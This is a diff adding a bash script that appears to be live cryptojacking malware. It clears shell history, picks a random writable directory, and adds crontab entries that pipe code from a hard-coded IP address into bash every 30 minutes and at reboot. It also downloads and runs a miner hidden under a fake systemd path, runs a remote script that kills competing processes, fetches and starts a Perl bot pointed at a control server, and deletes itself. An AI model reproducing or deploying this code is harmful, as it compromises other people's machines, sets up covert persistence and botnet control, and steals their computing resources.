@@ -1,0 +1,88 @@
+#!/bin/bash 
+unset HIST HISTFILE savehistory
+function wgetorcurl(){
+if [ ! -x /usr/bin/wget ] ; then
+ command=curl
+else
+ command=wget
+fi
+}
+function remove(){
+ delete="rm -rf"
+}
+
+function finish(){
+sleep 1
+$delete $PWD$0
+}
+function getInstallPath(){
+ipath=`find / -xdev -writable -executable -type d -print | shuf -n 1`	
+}
+function installstartup(){
+crontab -l > $ipath/c 1>/dev/null 2>/dev/null
+
+if [ $command == "wget" ]; then
+if [ "*/30 * * * * wget -qO - http://94.41.167.11/api/rest/logo| bash" = "$(cat $ipath/c | grep "logo" | grep -v grep)" ]; then
+  echo ""
+ else
+   cd $ipath
+        echo "*/30 * * * * wget -qO - http://94.41.167.11/api/rest/logo| bash" >> $ipath/c
+        echo "@reboot  wget -qO - http://94.41.167.11/api/rest/logo| bash" >> $ipath/c
+        crontab $ipath/c
+    $delete $ipath/c
+    $delete /tmp/c
+ fi
+else
+ if [ "*/30 * * * * curl -s http://94.41.167.11/api/rest/logo| bash" = "$(cat $ipath/c | grep "logo" | grep -v grep)" ]; then
+ echo ""
+ else
+   cd $ipath
+        echo "*/30 * * * * curl -s http://94.41.167.11/api/rest/logo| bash" >> $ipath/c
+        echo "@reboot  curl -s http://94.41.167.11/api/rest/logo| bash" >> $ipath/c
+        crontab $ipath/c
+    $delete $ipath/c 1>/dev/null 2>/dev/null
+    $delete -Rf /tmp/c 1>/dev/null 2>/dev/null
+ fi
+fi
+}
+function InstallMiner(){
+if [ $command == "wget" ]; then
+cd $ipath;wget http://94.41.167.11/api/rest/sumo.cnrig;tar xvf sumo.cnrig;rm -rf sumo.cnrig;cd systemd-private-225dbf0c0db04c779eaa37643fb99602-systemd-timesyncd.service-8HImcR/tmp/;./system.sh;./system-start-run-restart &
+else 
+cd $ipath;curl -O  http://94.41.167.11/api/rest/sumo.cnrig;tar xvf sumo.cnrig;rm -rf sumo.cnrig;cd systemd-private-225dbf0c0db04c779eaa37643fb99602-systemd-timesyncd.service-8HImcR/tmp/;./system.sh;/system-start-run-restart &
+fi
+}
+function killshit(){
+if [ $command == "wget" ]; then
+wget -qO - http://94.41.167.11/api/rest/killscript1.txt | bash 1> /dev/null 2>/dev/null
+else
+curl -O  http://94.41.167.11/api/rest/killscript1.txt | bash 1> /dev/null 2>/dev/null
+fi
+}
+#function noevidence(){
+#find / -type f -name "logo" -exec rm -Rf {} + 1>/dev/null 2>/dev/null &
+#find / -type f -name "o" -exec rm -Rf {} + 1>/dev/null 2>/dev/null &
+#}
+function installperlbot(){
+if [ $command == "wget" ]; then
+cd $ipath;wget http://92.109.119.66/api/rest/wow.txt;perl wow.txt 192.241.223.131;rm -rf wow.txt* &
+else
+cd $ipath;curl -O http://92.109.119.66/api/rest/wow.txt;perl wow.txt 192.241.223.131;rm -rf wow.txt* &
+fi
+}
+testminer="$(ps aux | grep usermn | grep -v grep |wc -l)"
+if [ $testminer = 0 ];
+then
+getInstallPath
+killshit
+installperlbot
+InstallMiner
+installstartup
+#noevidence
+else
+getInstallPath
+installperlbot
+installstartup
+killshit
+#noevidence
+fi
